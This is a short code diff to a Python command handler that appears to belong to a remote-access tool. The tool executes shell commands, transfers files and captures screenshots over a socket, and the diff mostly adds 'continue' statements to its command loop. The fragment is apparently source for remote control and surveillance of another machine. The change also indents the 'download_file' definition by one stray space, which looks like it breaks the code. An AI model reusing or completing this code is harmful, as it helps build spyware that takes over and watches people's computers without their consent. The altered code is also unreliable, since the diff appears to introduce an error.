@@ -21,17 +21,19 @@ def clienthandler(my_socket):
               
          if cmd == "03" or cmd =="3":
              upload_file_folder(my_socket)
-
+             continue
+             
          if cmd == "04" or cmd =="4":
              capture_screenshot(my_socket)
+             continue
          
          elif cmd == "quit" or cmd == "exit" or cmd == "99" :
              break
+         
          else :
              print("[+] Invalid Input")
              break
-                   
-         
+                          
 def exe_commads(my_socket):
      print("[+] Executing Commands")
      while True:
@@ -63,8 +65,7 @@ def runshell(cmd):
          std_out = output.stderr.decode("utf-8")
      return std_out
  
- 
-def download_file(my_socket):
+ def download_file(my_socket):
      print("[+] Downloading File")
      filename=my_socket.recv_data()
      my_socket.recv_file(filename)
